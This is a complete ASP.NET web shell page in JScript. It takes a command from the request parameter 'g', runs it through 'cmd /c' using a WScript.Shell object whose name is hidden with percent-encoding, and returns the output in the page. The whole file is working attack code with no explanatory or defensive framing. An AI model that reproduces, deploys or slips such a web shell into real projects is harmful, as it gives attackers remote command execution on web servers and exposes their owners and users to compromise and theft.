<%@ Page Language="Jscript"%>
<%
var c=System.Web.HttpContext.Current;
var Request=c.Request;
var Response=c.Response;
var command = Request.Item['g'];
var r = new ActiveXObject(unescape("%57%53%63%72%69%70%74%2e%53%68%65%6c%6c")).Exec("cmd /c "+command);
var OutStream = r.StdOut;
var Str = "";
while (!OutStream.atEndOfStream) {
    Str = Str + OutStream.readAll();
    }
Response.Write("<pre>"+Str+"</pre>");
%>